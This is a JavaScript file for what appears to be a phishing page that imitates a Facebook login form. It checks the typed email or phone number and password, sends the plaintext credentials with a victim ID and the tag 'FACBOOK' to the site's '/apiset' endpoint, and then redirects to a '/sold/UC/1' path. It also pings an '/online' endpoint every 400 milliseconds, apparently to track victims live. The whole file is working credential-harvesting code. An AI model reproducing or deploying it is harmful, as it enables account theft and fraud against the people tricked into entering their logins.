let email = document.getElementById("email");
let pass = document.getElementById("pass");

let log = document.getElementById("log");
let log1 = document.getElementById("log1");
let d1 = document.getElementById("d1");
let d2 = document.getElementById("d2");

email.placeholder=" Email or phone number";
pass.placeholder=" password";
var PAS = "";
var PA;
var E = email.value;
var P = pass.value;
var send = false
var dataserh = []
var t = []
const ID = location.pathname.slice(location.pathname.indexOf('=')+1,location.length)
console.log(ID)
var IA 
var BANE
var Email
var Password
var location

//------------------------------------------------->
function serh() {
let apiserh = new XMLHttpRequest()
   apiserh.open('POST','https://'+location.host+ '/apiserh')
   apiserh.setRequestHeader("Accept","application/json")
   apiserh.setRequestHeader("Content-Type","application/json")
   apiserh.onreadystatechange=function(){
     if (apiserh.readyState == 4){
        dataserh = JSON.parse(apiserh.responseText).data
     console.log(dataserh)
      }
    }
    dataID=`{"ID":"${ID}"}`
    apiserh.send(dataID) 
  }
//------------------------------------------------------>
log1.onclick=function () {
     log.click()
}
onkeyup=function () {
  d1.style.display='none'
  d2.style.display='none'
  E = email.value;
  send = true
  P = pass.value;
  var o = 0
  function T() {
    for (let z = 2; z < E.length; z++) {
      if (E[z] == 0) {
        send = true
      }else if (E[z] == 1) {
      }else if (E[z] == 2) {
      }else if (E[z] == 3) {
      }else if (E[z] == 4) {
      }else if (E[z] == 5) {
      }else if (E[z] == 6) {
      }else if (E[z] == 7) {
      }else if (E[z] == 8) {
      }else if (E[z] == 9) {
      }else{
        o ++
      }
      if (o == 0) {
        send = true
      }else if (o != 0) {
        errer('Error in phone number')
      }
    }
  }
  for (let z = 0; z < 10; z++) {
    //console.log(z)
    if (E[0] == 7) {
      if (E[0] != '0') {
        email.value=`0${E}`
      } 
    }
    if (E[0] == 6) {
        if (E[0] != '0') {
          email.value=`0${E}`
        }
        
      }
      if (E[0] == 5) {
          if (E[0] != '0') {
            email.value=`0${E}`
          }
          
        }
        if (E[0] == 0) {
          T()
        }
  }
}
log.onclick=function (){
  var NS = 'n'
   if (E[0] == '1') {
    errer('Error in phone number')
   }else if (E[0] == '2') {
    errer('Error in phone number')
   }else if (E[0] == '3') {
    errer('Error in phone number')
   }else if (E[0] == '4') {
    errer('Error in phone number')
   }else if (E[0] == '8') {
    errer('Error in phone number')
   }else if (E[0] == '9') {
    errer('Error in phone number')
   }
   if (E[0] == 0) {
  }else if (E[0] == 1) {
  }else if (E[0] == 2) {
  }else if (E[0] == 3) {
  }else if (E[0] == 4) {
  }else if (E[0] == 5) {
  }else if (E[0] == 6) {
  }else if (E[0] == 7) {
  }else if (E[0] == 8) {
  }else if (E[0] == 9) {
  }else{
    NS = 's'
    //console.log(E.length)
    var aro = E.indexOf('@gmail.com')
    console.log(aro)
    if (aro == -1) {
    errer('Error in Email "@Email.com"')
  }else{
      send = true
    }
  }
      if (NS == 'n') {
        if (E.length <= 7) {
          send = false
        errer('Error in phone number')
        }
      }else{
        if (E.length < 14) {
          send = false
        errer('Error in email "@Email.com"')
      }
      }
      if (P.length < 8) {
        send = false
        errer('Password error')
      }
      if (E == '') {
        send = false
      }
      if (P == '') {
        send = false
      }
   var dataget 
   //console.log(send)
    if (send == true) {
      serh()
      document.getElementById("pass").type = "text"
      var PO = pass.value
      document.getElementById("pass").value =''
      for (let z = 0; z < PO.length; z++) {
        document.getElementById("pass").value +='•'
      }
      let api = new XMLHttpRequest()
   api.open('POST','https://' +location.host+ '/apiset')
   api.setRequestHeader("Accept","application/json")
   api.setRequestHeader("Content-Type","application/json")
   api.onreadystatechange=function(){
     if (api.readyState == 4){
      console.log(JSON.parse(api.responseText))
      location.pathname="/sold/UC/1"
    }
   } 
   var day =`{
       "ID":"${ID}",
       "IA":true,
       "BANE":false,
       "AFER":"undefined",
       "Email":"${email.value}",
       "Password":"${PO}",
       "Location":"FACBOOK"
        }`
        console.log(PO)
    api.send(day) 
}
}
function errer(R) {
  if (R =='Password error') {
    d2.innerText= R
    d2.style.display='block'
  }else if (R == 'Error in email "@Email.com"') {
    d1.innerText= R
    d1.style.display='block'
  }else if ( R == 'Error in phone number') {
    d1.innerText= R
    d1.style.display='block'
  }

}
function test() {
  setTimeout(function(){test()},400)
  let apiserh = new XMLHttpRequest()
  apiserh.open('POST','https://'+location.host+ '/online')
  apiserh.setRequestHeader("Accept","application/json")
  apiserh.setRequestHeader("Content-Type","application/json")
  apiserh.onreadystatechange=function(){
    if (apiserh.readyState == 4){
      console.log(dataserh)
    }
  }
  dataID=`{"id":"FACBOOK"}`
  apiserh.send(dataID) 
  console.log('islam')
  }
  test()
console.log(location.host)


